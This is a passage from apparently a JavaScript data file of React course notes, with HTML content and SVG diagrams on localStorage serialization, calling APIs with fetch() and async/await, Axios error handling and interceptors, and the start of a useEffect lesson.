                    <text x="25" y="98" class="svg-mono-xs">setItem('user', JSON.stringify(user))</text>
                    <text x="25" y="118" class="svg-mono-xs">• Serializes to valid JSON text</text>
                    <text x="25" y="138" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• '{&quot;username&quot;:&quot;Sarthak&quot;,&quot;age&quot;:18}'</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--success);">100% data fidelity preserved ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "32.2",
          title: "Serialization & Deserialization Pipeline With Defensive Error Guards",
          content: `
            <p>
              To safely store complex JavaScript objects or arrays in LocalStorage, we use a two-step serialization pipeline:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Step 1: Serialization via <code>JSON.stringify()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Converts the JavaScript in-memory object into a valid, UTF-8 formatted JSON string:
                    <br><code>const jsonString = JSON.stringify(user);</code>
                    <br>&rarr; Result: <code>'{"name":"Sarthak","role":"Engineer"}'</code>
                  </li>
                  <li>Now you can safely call: <code>localStorage.setItem('user', jsonString);</code></li>
                </ul>
              </li>
              <li><strong>Step 2: Deserialization via <code>JSON.parse()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>When reading back, parse the stored string back into a living JavaScript object:
                    <br><code>const userObj = JSON.parse(localStorage.getItem('user'));</code>
                  </li>
                </ul>
              </li>
              <li><strong>Defensive Parsing Guard (Production Standard):</strong>
                <ul class="notes-sub-list">
                  <li>If LocalStorage is empty or contains malformed JSON, <code>JSON.parse()</code> throws an unhandled SyntaxError that crashes the entire React application! Always wrap deserialization in a <code>try...catch</code> block:</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>// Production Helper Utility for LocalStorage Access:
export const storageService = {
  // Safe write
  save: (key, data) => {
    try {
      const serialized = JSON.stringify(data);
      localStorage.setItem(key, serialized);
    } catch (err) {
      console.error('Failed to save to localStorage:', err);
    }
  },

  // Safe read with fallback default
  load: (key, defaultValue = null) => {
    try {
      const item = localStorage.getItem(key);
      return item ? JSON.parse(item) : defaultValue;
    } catch (err) {
      console.warn('Malformed data found for key "' + key + '", returning default:', err);
      return defaultValue;
    }
  }
};</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 32.2 · Bidirectional Object Storage Pipeline: Heap Object ↔ Serialized JSON String</span>
                <span class="diagram-frame-tag">SERIALIZATION DATA PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Bidirectional pipeline showing serialization to JSON string on write and deserialization with parse on read">
                  <!-- JavaScript In-Memory Heap -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="260" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="152" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="91" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JS IN-MEMORY HEAP</text>
                    <text x="130" y="58" text-anchor="middle" class="svg-title">Live Object / Array</text>

                    <rect x="15" y="74" width="230" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">{</text>
                    <text x="35" y="118" class="svg-mono-xs">  username: &quot;Sarthak&quot;,</text>
                    <text x="35" y="138" class="svg-mono-xs">  age: 18, city: &quot;Bhopal&quot;</text>
                    <text x="25" y="158" class="svg-mono-xs">}</text>
                  </g>

                  <!-- Top Arrow: JSON.stringify() -->
                  <path d="M 295 85 L 435 85" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="435,81 443,85 435,89" fill="var(--primary)"/>
                  <rect x="305" y="62" width="145" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--primary)"/>
                  <text x="377.5" y="76" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JSON.stringify()</text>

                  <!-- Bottom Arrow: JSON.parse() -->
                  <path d="M 435 155 L 295 155" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="295,151 287,155 295,159" fill="var(--success)"/>
                  <rect x="315" y="160" width="115" height="20" rx="4" fill="var(--bg-surface)" stroke="var(--success)"/>
                  <text x="372.5" y="174" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">JSON.parse()</text>

                  <!-- Browser LocalStorage Disk -->
                  <g transform="translate(450, 20)">
                    <rect x="0" y="0" width="405" height="190" rx="10" fill="var(--bg-surface)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="174" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="102" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">BROWSER LOCALSTORAGE</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">Serialized String Buffer</text>

                    <rect x="15" y="74" width="375" height="100" rx="6" fill="var(--bg-subsection)" stroke="var(--success)"/>
                    <text x="25" y="98" class="svg-mono-xs">Key: &quot;user&quot;</text>
                    <text x="25" y="122" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Val: '{&quot;username&quot;:&quot;Sarthak&quot;,&quot;age&quot;:18}'</text>
                    <text x="25" y="148" class="svg-mono-xs" style="fill:var(--text-muted);">Survives reloads, tabs &amp; laptop restarts</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 33
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-33-calling-apis-with-fetch-async-await",
      number: "33",
      shortLabel: "APIs With fetch() & async",
      title: "Calling APIs With fetch() & async / await",
      summary: "Client-server API architectures, native fetch() vs. Axios, understanding pending asynchronous promises, the two-stage await stream handshake, and handling HTTP error statuses.",
      subtopicLabels: ["33.1 fetch() vs Axios", "33.2 Async Promises", "33.3 Two-Stage Handshake"],
      diagramCount: 2,
      sections: [
        {
          num: "33.1",
          title: "fetch() vs. Axios & The Asynchronous Event Loop",
          content: `
            <p>
              Modern frontend web applications rely on remote Application Programming Interfaces (APIs) to fetch data from cloud databases and external services (e.g., weather updates, user profiles, product catalogs).
            </p>

            <ul class="notes-bullet-list">
              <li><strong>How Browsers Fetch Data:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Native <code>fetch()</code> API:</strong> Built directly into every modern web browser. Requires zero external npm packages, but requires manual handling for JSON parsing and error status codes.</li>
                  <li><strong>Axios:</strong> The industry-standard third-party HTTP client (<code>npm install axios</code>) that provides automatic JSON parsing, request/response interceptors, and cleaner syntax.</li>
                </ul>
              </li>
              <li><strong>The Non-Blocking Event Loop Mental Model:</strong>
                <ul class="notes-sub-list">
                  <li>JavaScript in the browser is <strong>single-threaded</strong>—it possesses only one primary Call Stack. If network requests blocked the call stack, your entire website would freeze completely (unclickable buttons, frozen animations) until the cloud server replied!</li>
                  <li>To prevent UI freezing, network calls run asynchronously via <strong>Web APIs</strong> and resolve through the <strong>Microtask Queue</strong>, keeping the main UI thread buttery smooth at 60 frames per second.</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 33.1 · Synchronous JS Call Stack vs. Asynchronous Promise &amp; Event Loop Pipeline</span>
                <span class="diagram-frame-tag">EVENT LOOP &amp; ASYNC HANDSHAKE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Visualizing synchronous JavaScript execution delegating fetch network call to browser Web APIs and resolving via Microtask Queue">
                  <!-- Main Call Stack -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="240" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">JS CALL STACK</text>
                    <text x="120" y="58" text-anchor="middle" class="svg-title">Single Threaded</text>

                    <rect x="15" y="74" width="210" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">1. Runs synchronously</text>
                    <text x="25" y="118" class="svg-mono-xs">2. Calls fetch(url)</text>
                    <text x="25" y="138" class="svg-mono-xs">3. Cannot freeze UI</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">→ Offloads to Web API</text>
                  </g>

                  <!-- Arrow 1 -->
                  <line x1="270" y1="115" x2="305" y2="115" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="305,111 313,115 305,119" fill="var(--primary)"/>

                  <!-- Browser Web API Engine -->
                  <g transform="translate(315, 20)">
                    <rect x="0" y="0" width="250" height="190" rx="10" fill="var(--bg-surface)" stroke="var(--warning)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="145" height="22" rx="4" fill="var(--warning-bg)" stroke="var(--warning)" stroke-width="1.2"/>
                    <text x="87.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">BROWSER WEB APIS</text>
                    <text x="125" y="58" text-anchor="middle" class="svg-title" style="fill:var(--warning);">Network Thread</text>

                    <rect x="15" y="74" width="220" height="100" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">• Sends HTTP GET to API</text>
                    <text x="25" y="118" class="svg-mono-xs">• Returns Promise: Pending</text>
                    <text x="25" y="138" class="svg-mono-xs">• Waits for network (200ms)</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">→ Resolves to Microtask</text>
                  </g>

                  <!-- Arrow 2 -->
                  <line x1="570" y1="115" x2="605" y2="115" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="605,111 613,115 605,119" fill="var(--success)"/>

                  <!-- Microtask Queue & await resume -->
                  <g transform="translate(615, 20)">
                    <rect x="0" y="0" width="240" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="137" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="83.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">MICROTASK QUEUE</text>
                    <text x="120" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">await Resume</text>

                    <rect x="15" y="74" width="210" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="98" class="svg-mono-xs">1. Promise fulfilled ✓</text>
                    <text x="25" y="118" class="svg-mono-xs">2. Event Loop pushes back</text>
                    <text x="25" y="138" class="svg-mono-xs">3. await unpauses code</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">4. response is returned</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "33.2",
          title: "Synchronous Execution vs. Asynchronous Promises",
          content: `
            <p>
              When an API request is initiated, the response is not instantaneous—it travels across fiber optic cables and cloud servers, taking anywhere from 50ms to 2000ms.
            </p>

            <ul class="notes-bullet-list">
              <li><strong>The Pending Promise Trap:</strong>
                <pre class="notes-code-block"><code>// ❌ JUNIOR MISTAKE: Treating async call as synchronous
function loadData() {
  const response = fetch('https://api.example.com/users');
  console.log(response); // Prints: Promise { &lt;pending&gt; }, NOT the users!
}</code></pre>
              </li>
              <li><strong>The Solution — <code>async / await</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Mark the enclosing function as <code>async</code>.</li>
                  <li>Use the <code>await</code> keyword to pause the local function execution until the promise settles, without blocking the browser UI thread!</li>
                </ul>
              </li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 33.2 · Two-Stage fetch() Pipeline: Network Stream Handshake &amp; JSON Stream Body Parsing</span>
                <span class="diagram-frame-tag">STREAM HANDSHAKE PIPELINE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 210" class="arch-svg" role="img" aria-label="Two-stage fetch process showing first await resolving HTTP headers and second await consuming response body stream">
                  <!-- Stage 1 -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="380" height="170" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="212" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="121" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STAGE 1: AWAIT FETCH(URL)</text>
                    <text x="190" y="56" text-anchor="middle" class="svg-title">HTTP Stream Handshake</text>

                    <rect x="15" y="72" width="350" height="82" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Resolves HTTP Status (200 OK)</text>
                    <text x="25" y="114" class="svg-mono-xs">• Reads response headers &amp; metadata</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">• Body is still unread ReadableStream!</text>
                  </g>

                  <!-- Arrow -->
                  <line x1="410" y1="105" x2="465" y2="105" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="465,101 473,105 465,109" fill="var(--success)"/>
                  <text x="440" y="92" text-anchor="middle" class="svg-mono-xs" style="fill:var(--text-muted); font-size:10px;">Streams Body</text>

                  <!-- Stage 2 -->
                  <g transform="translate(475, 20)">
                    <rect x="0" y="0" width="380" height="170" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="212" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="121" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STAGE 2: AWAIT RES.JSON()</text>
                    <text x="190" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">Stream Body Deserialization</text>

                    <rect x="15" y="72" width="350" height="82" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs">• Reads incoming byte stream to end</text>
                    <text x="25" y="114" class="svg-mono-xs">• Parses JSON syntax into JS Object</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">• Returns final JS Object / Array ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "33.3",
          title: "The Two-Stage Handshake (res.json()) & Defensive Error Handling",
          content: `
            <p>
              One of the most confusing aspects of native <code>fetch()</code> is why it requires <strong>two distinct <code>await</code> statements</strong> to receive data:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>Stage 1 — <code>const res = await fetch(url)</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Resolves as soon as the cloud server responds with the <strong>HTTP Response Headers</strong> and status code (e.g. <code>200 OK</code>). The actual payload body has NOT fully downloaded yet!</li>
                </ul>
              </li>
              <li><strong>Stage 2 — <code>const data = await res.json()</code>:</strong>
                <ul class="notes-sub-list">
                  <li>Reads the incoming byte stream from the network buffer and deserializes the raw text into a living JavaScript Object. Because reading a data stream is asynchronous, it requires its own <code>await</code>!</li>
                </ul>
              </li>
              <li><strong>The Critical <code>res.ok</code> Gotcha:</strong>
                <ul class="notes-sub-list">
                  <li><strong>Important:</strong> <code>fetch()</code> will NOT reject or throw an error on HTTP error status codes like <code>404 Not Found</code> or <code>500 Internal Server Error</code>! It only rejects on total network failure.</li>
                  <li>You must defensively inspect <code>if (!res.ok) throw new Error(...)</code> manually!</li>
                </ul>
              </li>
            </ul>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';

function UserDirectory() {
  const [users, setUsers] = useState([]);
  const [isLoading, setIsLoading] = useState(false);
  const [errorMsg, setErrorMsg] = useState(null);

  const fetchUsers = async () => {
    setIsLoading(true);
    setErrorMsg(null);

    try {
      // Stage 1: Wait for HTTP headers
      const res = await fetch('https://jsonplaceholder.typicode.com/users');
      
      // Critical defensive status check
      if (!res.ok) {
        throw new Error('HTTP Error: ' + res.status + ' (' + res.statusText + ')');
      }

      // Stage 2: Wait for stream body parsing
      const data = await res.json();
      setUsers(data);
    } catch (err) {
      console.error('Fetch failed:', err.message);
      setErrorMsg(err.message);
    } finally {
      setIsLoading(false);
    }
  };

  return (
    &lt;div className="p-6 max-w-md mx-auto"&gt;
      &lt;button 
        onClick={fetchUsers}
        disabled={isLoading}
        className="px-4 py-2 bg-emerald-600 text-white rounded font-medium disabled:opacity-50"
      &gt;
        {isLoading ? 'Loading Users...' : 'Fetch User List'}
      &lt;/button&gt;

      {errorMsg && (
        &lt;p className="mt-3 text-sm text-red-600 font-semibold"&gt;Error: {errorMsg}&lt;/p&gt;
      )}

      &lt;ul className="mt-4 space-y-2"&gt;
        {users.map(u => (
          &lt;li key={u.id} className="p-2.5 border rounded bg-card text-sm"&gt;
            &lt;span className="font-bold"&gt;{u.name}&lt;/span&gt; · {u.email}
          &lt;/li&gt;
        ))}
      &lt;/ul&gt;
    &lt;/div&gt;
  );
}

export default UserDirectory;</code></pre>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 34
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-34-calling-apis-with-axios",
      number: "34",
      shortLabel: "APIs With Axios",
      title: "Calling APIs With Axios (Cleaner & Shorter Method)",
      summary: "Why production teams prefer Axios over native fetch: automatic JSON body parsing, automatic 4xx/5xx HTTP error rejection, request and response interceptors, and request cancellation.",
      subtopicLabels: ["34.1 Why Axios", "34.2 Automatic Error Handling", "34.3 Interceptors & Tokens"],
      diagramCount: 2,
      sections: [
        {
          num: "34.1",
          title: "Why Axios Over Native fetch()? (Feature Comparison)",
          content: `
            <p>
              While native <code>fetch()</code> is capable, real-world engineering teams universally favor <strong>Axios</strong> for building scalable web apps due to several decisive advantages:
            </p>

            <ul class="notes-bullet-list">
              <li><strong>1. Automatic JSON Transformation:</strong> With native <code>fetch()</code>, you must remember to call <code>await res.json()</code> on every single request. Axios handles stream transformation automatically—your parsed JavaScript data is immediately accessible at <code>response.data</code> in one single <code>await</code>!</li>
              <li><strong>2. Automatic HTTP Error Rejection:</strong> Native <code>fetch()</code> will happily enter your success path on a <code>404 Not Found</code> or <code>500 Server Crash</code>. Axios automatically throws an error on any response status code outside the <code>2xx</code> range, allowing your standard <code>try...catch</code> block to catch all errors seamlessly.</li>
              <li><strong>3. Interceptors:</strong> Axios lets you define global middleware interceptors to automatically inject authorization headers (e.g. <code>Bearer &lt;token&gt;</code>) into every outgoing request and refresh expired tokens on <code>401 Unauthorized</code>.</li>
            </ul>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 34.1 · Native fetch() vs. Axios Execution Pipeline: 2-Stage Stream vs. 1-Stage Auto-Deserialization</span>
                <span class="diagram-frame-tag">HTTP CLIENT ARCHITECTURE COMPARISON</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 230" class="arch-svg" role="img" aria-label="Comparison showing fetch requiring two await steps vs Axios executing in one await step with response.data ready">
                  <!-- Native fetch() -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--bg-subsection)" stroke="var(--border)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="130" height="22" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="80" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">NATIVE FETCH()</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title">2-Step Manual Stream Parsing</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="98" class="svg-mono-xs">1. const res = await fetch(url)</text>
                    <text x="25" y="118" class="svg-mono-xs" style="fill:var(--warning); font-weight:700;">2. const data = await res.json() ⚠</text>
                    <text x="25" y="138" class="svg-mono-xs">• Manual 2-stage stream consumption</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--text-muted);">Built-in, but more boilerplate</text>
                  </g>

                  <!-- Axios -->
                  <g transform="translate(455, 20)">
                    <rect x="0" y="0" width="400" height="190" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="123" height="22" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="76.5" y="30" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">AXIOS LIBRARY</text>
                    <text x="200" y="58" text-anchor="middle" class="svg-title" style="fill:var(--success);">1-Step Auto-Deserialization</text>

                    <rect x="15" y="74" width="370" height="100" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="98" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">1. const res = await axios.get(url) ✓</text>
                    <text x="25" y="118" class="svg-mono-xs">• res.data is ALREADY parsed JS data</text>
                    <text x="25" y="138" class="svg-mono-xs">• Zero second await needed</text>
                    <text x="25" y="158" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Cleaner, faster &amp; production standard ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        },
        {
          num: "34.2",
          title: "Core Axios Syntax & Clean Error Handling",
          content: `
            <p>
              Installation is straightforward: <code>npm install axios</code>. Once installed, making GET, POST, PUT, and DELETE requests requires just one concise line:
            </p>

            <pre class="notes-code-block"><code>import React, { useState } from 'react';
import axios from 'axios';

function ProductCatalog() {
  const [products, setProducts] = useState([]);
  const [loading, setLoading] = useState(false);

  const fetchProducts = async () => {
    setLoading(true);
    try {
      // Single await: response.data is already deserialized JSON!
      const response = await axios.get('https://fakestoreapi.com/products?limit=5');
      setProducts(response.data);
    } catch (err) {
      // Axios error objects provide rich diagnostic details
      if (err.response) {
        // Server responded with non-2xx status (e.g. 404, 500)
        console.error('Server responded with status:', err.response.status);
      } else if (err.request) {
        // Request made but no response received (network offline)
        console.error('Network unreachable, check connection.');
      } else {
        console.error('Error setup:', err.message);
      }
    } finally {
      setLoading(false);
    }
  };

  return (
    &lt;div className="p-6"&gt;
      &lt;button onClick={fetchProducts} className="px-4 py-2 bg-emerald-600 text-white rounded font-bold"&gt;
        {loading ? 'Fetching...' : 'Load Products via Axios'}
      &lt;/button&gt;

      &lt;div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-6"&gt;
        {products.map(p => (
          &lt;div key={p.id} className="p-4 border rounded-lg bg-card shadow-sm"&gt;
            &lt;h4 className="font-bold text-sm"&gt;{p.title}&lt;/h4&gt;
            &lt;p className="text-emerald-600 font-mono font-semibold mt-1"&gt;\${p.price}&lt;/p&gt;
          &lt;/div&gt;
        ))}
      &lt;/div&gt;
    &lt;/div&gt;
  );
}

export default ProductCatalog;</code></pre>
          `
        },
        {
          num: "34.3",
          title: "Production Interceptors & Centralized API Instances",
          content: `
            <p>
              In production applications, you never call <code>axios.get('https://api.mycompany.com/...')</code> directly in your components. Instead, you create a configured Axios instance with base URLs, timeouts, and request interceptors:
            </p>

            <pre class="notes-code-block"><code>// api/axiosClient.js
import axios from 'axios';

const apiClient = axios.create({
  baseURL: 'https://api.mycompany.com/v1',
  timeout: 10000, // 10 second timeout
  headers: {
    'Content-Type': 'application/json'
  }
});

// Request Interceptor: Automatically inject Auth Token
apiClient.interceptors.request.use(
  (config) => {
    const token = sessionStorage.getItem('auth_token');
    if (token) {
      config.headers.Authorization = 'Bearer ' + token;
    }
    return config;
  },
  (error) => Promise.reject(error)
);

// Response Interceptor: Handle Global 401 Unauthorized
apiClient.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response && error.response.status === 401) {
      console.warn('Session expired. Redirecting to login...');
      window.location.href = '/login';
    }
    return Promise.reject(error);
  }
);

export default apiClient;</code></pre>

            <figure class="diagram-frame">
              <div class="diagram-frame-header">
                <span class="diagram-frame-title">Diagram 34.2 · React API State Pipeline: Network Response to State Setter to DOM Card Render</span>
                <span class="diagram-frame-tag">API TO DOM STATE LIFECYCLE</span>
              </div>
              <div class="diagram-svg-wrap">
                <svg viewBox="0 0 880 220" class="arch-svg" role="img" aria-label="End to end React pipeline from button click to axios get, state setter dispatch, re-render, and array mapping cards into the DOM">
                  <!-- Step 1: User Click -->
                  <g transform="translate(25, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 01</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">Trigger Action</text>

                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">&lt;button onClick&gt;</text>
                    <text x="25" y="114" class="svg-mono-xs">Fires getData()</text>
                    <text x="25" y="134" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">await axios.get()</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--text-muted);">Hits Picsum API</text>
                  </g>

                  <!-- Arrow 1 -->
                  <line x1="205" y1="110" x2="235" y2="110" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="235,106 243,110 235,114" fill="var(--primary)"/>

                  <!-- Step 2: State Dispatch -->
                  <g transform="translate(245, 20)">
                    <rect x="0" y="0" width="200" height="180" rx="10" fill="var(--bg-surface)" stroke="var(--primary)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 02</text>
                    <text x="100" y="56" text-anchor="middle" class="svg-title">State Mutation</text>

                    <rect x="15" y="70" width="170" height="92" rx="6" fill="var(--bg-subsection)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">setData(res.data)</text>
                    <text x="25" y="114" class="svg-mono-xs">• Array of 30 items</text>
                    <text x="25" y="134" class="svg-mono-xs">• Triggers re-render</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--text-muted);">Reconciliation runs</text>
                  </g>

                  <!-- Arrow 2 -->
                  <line x1="445" y1="110" x2="475" y2="110" stroke="var(--primary)" stroke-width="2"/>
                  <polygon points="475,106 483,110 475,114" fill="var(--primary)"/>

                  <!-- Step 3: Array Mapping -->
                  <g transform="translate(485, 20)">
                    <rect x="0" y="0" width="180" height="180" rx="10" fill="var(--bg-subsection)" stroke="var(--primary)" stroke-width="1.6"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--primary-bg)" stroke="var(--primary)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--primary); font-weight:700;">STEP 03</text>
                    <text x="90" y="56" text-anchor="middle" class="svg-title">JSX Projection</text>

                    <rect x="15" y="70" width="150" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--border)"/>
                    <text x="25" y="94" class="svg-mono-xs">data.map(elem =&gt;)</text>
                    <text x="25" y="114" class="svg-mono-xs">• Returns Card JSX</text>
                    <text x="25" y="134" class="svg-mono-xs">• Assigns key={idx}</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--text-muted);">30 virtual cards</text>
                  </g>

                  <!-- Arrow 3 -->
                  <line x1="665" y1="110" x2="695" y2="110" stroke="var(--success)" stroke-width="2"/>
                  <polygon points="695,106 703,110 695,114" fill="var(--success)"/>

                  <!-- Step 4: Live DOM Render -->
                  <g transform="translate(705, 20)">
                    <rect x="0" y="0" width="150" height="180" rx="10" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.8"/>
                    <rect x="15" y="15" width="78" height="20" rx="4" fill="var(--success-bg)" stroke="var(--success)" stroke-width="1.2"/>
                    <text x="54" y="29" text-anchor="middle" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">STEP 04</text>
                    <text x="75" y="56" text-anchor="middle" class="svg-title" style="fill:var(--success);">DOM Render</text>

                    <rect x="15" y="70" width="120" height="92" rx="6" fill="var(--bg-surface)" stroke="var(--success)"/>
                    <text x="25" y="94" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Live Screen</text>
                    <text x="25" y="114" class="svg-mono-xs">30 Image Cards</text>
                    <text x="25" y="134" class="svg-mono-xs">Authors &amp; photos</text>
                    <text x="25" y="150" class="svg-mono-xs" style="fill:var(--success); font-weight:700;">Rendered ✓</text>
                  </g>
                </svg>
              </div>
            </figure>
          `
        }
      ]
    },

    /* ═══════════════════════════════════════════════════════════════
       TOPIC 35
       ═══════════════════════════════════════════════════════════════ */
    {
      id: "react-35-understanding-useeffect-road-truck",
      number: "35",
      shortLabel: "Understanding useEffect",
      title: "Understanding useEffect (The Road & Truck Analogy)",
      summary: "Pure rendering vs. side effects, the render phase vs. commit phase, the intuitive Road & Truck mental model, and keeping side effects from blocking the primary UI thread.",
      subtopicLabels: ["35.1 Pure UI vs Side Effects", "35.2 Road & Truck Model", "35.3 Infinite Loop Trap"],
      diagramCount: 2,
      sections: [
        {
          num: "35.1",
          title: "What Are Side Effects & Why React Demands Pure Rendering",
          content: `
            <p>
              To understand the <code>useEffect</code> hook, one must first master the fundamental principle of React: <strong>Components must be pure functions during the Render Phase</strong>.
